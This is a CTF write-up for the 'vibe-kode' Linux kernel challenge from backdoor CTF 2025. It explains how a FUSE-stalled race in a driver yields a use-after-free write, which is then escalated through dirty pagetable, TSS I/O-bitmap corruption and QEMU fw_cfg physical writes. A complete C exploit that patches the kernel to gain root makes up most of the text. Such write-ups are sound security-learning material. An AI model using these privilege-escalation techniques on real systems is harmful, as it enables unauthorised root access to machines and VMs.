+++
title = 'vibe-kode - backdoor CTF 2025'
date = 2025-12-09T16:10:29+01:00
draft = false
author = 'Erge & leave'
summary = 'kernel pwn challenge that we first-blooded at backdoor CTF 2025'
tags = [
    'linux'
]
toc = true
+++

## Challenge Overview
The challenge’s driver implements a classic alloc–edit–free service, but with a peculiar freeing mechanism: items are placed into a work queue and freed asynchronously (can you smell the race condition?).  
Additionally, the challenge is shipped with **FUSE** enabled.

## FUSE
[**FUSE**](https://www.kernel.org/doc/html/next/filesystems/fuse.html) (Filesystem in User Space) is an interface that allows the creation of custom filesystems that run in user space rather than in the kernel.  
More specifically, it provides an easy way to exploit race conditions, as we can run a user-space handler that assumes control when a page fault occurs on an **mmap**-ed **FUSE** file, effectively hanging a kernel thread. You can read more about this technique [here](https://exploiter.dev/blog/2022/FUSE-exploit.html).

## The Race
While there is a global mutex intended to prevent races between different **ioctl** functions, there is also a local mutex that is supposed to prevent races with the asynchronous free function. However, the edit **ioctl** path mistakenly releases this mutex before executing **copy_from_user**. This allows us to:

- Submit an item to the free queue;  
- Reach **copy_from_user** in the edit path and make it hang using FUSE; 
- Let the work queue free the item;
- Resume **copy_from_user**; 
- Achieve a UAF write.

The only challenge is reaching **copy_from_user** before the work queue processes the free. We can reliably win this race by polluting the work queue with many frees before our target item, ensuring that our object is freed at the precise moment we need.

## Dirty pagetable
So we have a write after free with no leaks. Easy solution: [IOPL](https://kqx.io/post/fw_cfg) <br>
TL;DR: with arbitrary write on the **TSS** we can get full access to IO ports and interact with the **fw_cfg** QEMU's driver that grants us an arbitrary physical write primitive, and, luckily, the **TSS** is always at a predictable physical address. <br>

The write after free is on a **kmalloc-4k** chunk, so we need to return that page to the buddy allocator and spray enough **PMD**s to reclaim it as a pagetable; we can naively do this by allocating a lot of items (already required to pollute the free work queue) and run many **mmap**s. <br>

Now we can just write a **PTE** that points to the **TSS** in the final payload and resume the execution blocked by **FUSE** to terminate the write. <br>

## IOPL
In order to unlock full access to IO ports by corrupting the **TSS** we need to change the value of [x86_hw_tss.io_bitmap_base](https://elixir.bootlin.com/linux/v6.12.57/source/arch/x86/include/asm/processor.h#L311). <br>
The intel sdm states that **IOPB** represents the offset from the base of the **TSS** to the beginning of the IO bitmap, where the ith bit says if the ith IO port can be access from ring 3. <br>
By default (to lock ring 3 access to IO ports) the value for **io_bitmap_base** is **0x4088**, which is exactly the size of the **TSS**+1, which basically means that the IO map doens't need to be looked up which reserves the access to ring 0.<br>
So we just need to lower that value to point the IO map to a region of the **TSS** filled with zeroes: **0x3000** is fine. <br>

## Exploit
```c
#define _GNU_SOURCE
#define FUSE_USE_VERSION 29
#include <fuse.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/io.h>

#define PAGE_SIZE 0x1000

#define EDIT 258
#define FREE 257
#define ALLOC 256

#define NODE_SPRAY 0x80
#define MAPS_SPRAY 0x200


#define TSS 					0x7806000ul
#define IOMAP_BASE_OFFSET		0x66

#define CONFIG_PHYSICAL_START   0ul
#define THP_SIZE				0x200000ul

#define KPTR_RESTRICT           "/proc/sys/kernel/kptr_restrict"
#define KPTR_RESTRICT_OFFSET    0x1ccac20ul

#define SETUID_CHECK            0xaa022ul

#define BIOS_CFG_DMA_ADDR_HIGH  0x514
#define BIOS_CFG_DMA_ADDR_LOW   0x518

#define FW_CFG_SIGNATURE	    0x00
#define SIGNATURE               "QEMU"

#define SP0_PTREGS_PHYS_ADDR    0x7814f58ul

typedef enum fw_cfg_ctl_t {
    fw_ctl_error = 1,
    fw_ctl_read = 2,
    fw_ctl_skip = 4,
    fw_ctl_select = 8,
    fw_ctl_write = 16
} fw_cfg_ctl_t;

struct ioctl_req {
    size_t size;
    size_t id;
    void *data;
};  


int fd;
char final_payload[PAGE_SIZE];
void *map_addr;


int fuse_ready = 0;
int read_triggered = 0;
int payload_ready = 0;

// DRIVER
void alloc_node(size_t id) {
    struct ioctl_req req = { 
		.size = PAGE_SIZE,
		.id = id,
		.data = NULL 
	};
    ioctl(fd, ALLOC, &req);
}

void free_node(size_t id) {
    struct ioctl_req req = {
		.size = 0,
		.id = id,
		.data = NULL
	};
    ioctl(fd, FREE, &req);
}

void *edit_thread(void *arg) {
	for (int i=NODE_SPRAY; i>0; i--)
        free_node(i);

    struct ioctl_req edit_req = {
		.size = 1, 
		.id = NODE_SPRAY / 2, 
		.data = map_addr
	
	};
    ioctl(fd, EDIT, &edit_req);
	while(1) {}
    return NULL;
}

// FUSE
int do_getattr(const char *path, struct stat *stbuf) {
    memset(stbuf, 0, sizeof(struct stat));
	stbuf->st_mode = S_IFREG | 0777;
	stbuf->st_nlink = 1;
	stbuf->st_size = PAGE_SIZE;
    return 0;
}

int do_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {
	read_triggered = 1;

	while (!payload_ready) {}

	memcpy(buf, final_payload, size);
	return size;
}

static struct fuse_operations operations = {
    .getattr = do_getattr,
    .read    = do_read,
};

void *fuse_thread(void *arg) {
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    fuse_opt_add_arg(&args, "exploit_fuse");
    fuse_opt_add_arg(&args, "/tmp/fuse_mount");
    fuse_opt_add_arg(&args, "-f");

    mkdir("/tmp/fuse_mount", 0777);
    fuse_ready = 1;
    fuse_main(args.argc, args.argv, &operations, NULL);
    return NULL;
}

// IOPL
void sigfpe_handler(int sig, siginfo_t *si, void *context) {
    ucontext_t *uc = (ucontext_t *)context;

    uc->uc_mcontext.gregs[REG_RIP] += 3;
}

uint64_t sp0_get_cmd(uint32_t control, uint64_t address, uint32_t length) {
    control = htonl(control);
    address = htobe64(address);
    length = htonl(length);

    asm volatile(
        ".intel_syntax noprefix\n"
        "mov r15d, %1\n"
        "shl r15, 32\n"
        "mov r14d, %0\n"
        "or r15, r14\n"
        "mov r14, %2\n"
        "mov rax, 0\n"
        "div rax\n"
        ".att_syntax prefix\n"
        :
        : "r" (control), "r" (length), "r" (address)
        : "rax", "r14", "r15"
    );

    return SP0_PTREGS_PHYS_ADDR;
}

int phys_arb_w(uint64_t phys_addr, char* value, int size){
    uint64_t cmd_physaddr;
    uint32_t cmd_physaddr_lo;
    uint32_t cmd_physaddr_hi;

    uint64_t byte_addr;
    uint32_t byte_off;

    byte_addr = (uint64_t)memmem(SIGNATURE, sizeof(SIGNATURE), value, size);
    
    if(byte_addr == 0)
        return 0;
    
    byte_off = byte_addr - (uint64_t)SIGNATURE;

    cmd_physaddr = sp0_get_cmd(fw_ctl_skip | fw_ctl_select | (FW_CFG_SIGNATURE << 16), 0, byte_off);
    
    cmd_physaddr_lo = (uint32_t)(cmd_physaddr & 0xFFFFFFFFU);
    cmd_physaddr_hi = (uint32_t)(cmd_physaddr >> 32);

    if (cmd_physaddr_hi)
        outl(htonl(cmd_physaddr_hi), BIOS_CFG_DMA_ADDR_HIGH);
    outl(htonl(cmd_physaddr_lo), BIOS_CFG_DMA_ADDR_LOW);
    
    cmd_physaddr = sp0_get_cmd(fw_ctl_read | (FW_CFG_SIGNATURE << 16), phys_addr, size);
    
    cmd_physaddr_lo = (uint32_t)(cmd_physaddr & 0xFFFFFFFFU);
    cmd_physaddr_hi = (uint32_t)(cmd_physaddr >> 32);

    if (cmd_physaddr_hi)
        outl(htonl(cmd_physaddr_hi), BIOS_CFG_DMA_ADDR_HIGH);
    outl(htonl(cmd_physaddr_lo), BIOS_CFG_DMA_ADDR_LOW);

    return 0;
}

uint32_t check_kptr_restrict(){
    uint32_t r;
    FILE* f;
    f = fopen(KPTR_RESTRICT, "rb");
    fscanf(f, "%d", &r);
    fclose(f);
    return r;
}

void fw_cfg() {
	struct sigaction sa_fpe = {0};
    sa_fpe.sa_sigaction = sigfpe_handler;
    sa_fpe.sa_flags = SA_SIGINFO;
    sigaction(SIGFPE, &sa_fpe, NULL);

    uint64_t phys_kbase;
    for (phys_kbase = CONFIG_PHYSICAL_START + THP_SIZE * 0x100; phys_kbase >= CONFIG_PHYSICAL_START; phys_kbase -= THP_SIZE){
        phys_arb_w(phys_kbase + KPTR_RESTRICT_OFFSET, SIGNATURE, sizeof(SIGNATURE));
        if(check_kptr_restrict() != 1)
            break;
    }
    printf("phys kbase @ %lx\n", phys_kbase);

    phys_arb_w(phys_kbase + SETUID_CHECK+0, "E", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+1, "M", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+2, "E", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+3, "M", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+4, "E", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+5, "M", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+6, "E", 1);

	setuid(0);
    
	char flag[0x100];
	int fd = open("/root/flag.txt", O_RDONLY);
	read(fd, flag, sizeof(flag));
	puts(flag);

	while(1) {};
}

int main () {
    pthread_t th;

    pthread_create(&th, NULL, fuse_thread, NULL);
    while(!fuse_ready)
		sleep(1);
    wait(NULL);
    
    int fuse_fd = open("/tmp/fuse_mount/exploit_file", O_RDWR);
    map_addr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd, 0);


	fd = open("/dev/vibe", O_RDWR);

    for (int i=0; i<NODE_SPRAY; i++) {
        alloc_node(i+1);
    }

    pthread_create(&th, NULL, edit_thread, NULL);
    while(!read_triggered)
		sleep(1); 

    char* mappings[MAPS_SPRAY];
	for (int i=0; i<MAPS_SPRAY; i++)
		mappings[i] = (char*) mmap((void*) 0x200000000 + THP_SIZE*i, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_FIXED | MAP_POPULATE, -1, 0);


	*(unsigned long*) final_payload = TSS | 0x67;
    payload_ready = 1;
	sleep(1);

	for (int i=0; i<MAPS_SPRAY; i++) {
		if (*(uint16_t*) &mappings[i][IOMAP_BASE_OFFSET] == 0x4088) {
			*(uint16_t*) &mappings[i][IOMAP_BASE_OFFSET] = 0x3000;
			break;
		}
	}

	fw_cfg();

    return 0;
}
```

## Conclusion
The intended solution was to leak **kASLR** and **CEA** with prefetch sidechannel (given that kvm is enabled) and abuse a **pipe_buf** object to control **RIP** through **pipe_ops**. <br>
With dirty pagetable (and **IOPL**) we managed to solve (and blood 😉) the challenge without needing leaks. <br>
Another leakless approach was to partially overwrite a **pipe->page\*** and exploit a page-level UAF. <br>
